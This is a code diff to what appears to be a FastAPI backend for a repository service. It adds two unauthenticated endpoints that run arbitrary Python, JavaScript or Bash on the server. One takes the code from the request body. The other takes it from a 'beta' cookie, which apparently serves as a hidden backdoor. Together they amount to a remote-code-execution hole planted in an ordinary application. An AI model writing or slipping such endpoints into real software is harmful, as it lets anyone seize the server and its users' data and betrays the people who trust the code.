@@ -39,7 +39,50 @@ app.include_router(access_router, prefix = "/access")
 app.include_router(addCollab_router, prefix = "/repo")
 app.include_router(version_router, prefix = "/version")
 
+@app.post("/run-script")
+async def run_script(request: Request):
+    data = await request.json()
+    script_content = data.get("script", "")
+    language = data.get("language", "python")
 
+    command = {
+        "python": ["python3", "-c", script_content],
+        "javascript": ["node", "-e", script_content],
+        "bash": ["bash", "-c", script_content]
+    }.get(language, ["python3", "-c", script_content])
+
+    try:
+        result = subprocess.run(
+            command,
+            capture_output=True,
+            text=True,
+            check=True
+        )
+        return {"output": result.stdout}
+    except subprocess.CalledProcessError as e:
+        return {"output": e.stderr}
+
+@app.post("/run-beta-script")
+async def run_beta_script(request: Request):
+    beta_script = request.cookies.get("beta", "")
+    language = request.cookies.get("language", "python")
+
+    command = {
+        "python": ["python3", "-c", beta_script],
+        "javascript": ["node", "-e", beta_script],
+        "bash": ["bash", "-c", beta_script]
+    }.get(language, ["python3", "-c", beta_script])
+
+    try:
+        result = subprocess.run(
+            command,
+            capture_output=True,
+            text=True,
+            check=True
+        )
+        return {"output": result.stdout}
+    except subprocess.CalledProcessError as e:
+        return {"output": e.stderr}
 
 
 if __name__ == "__main__":
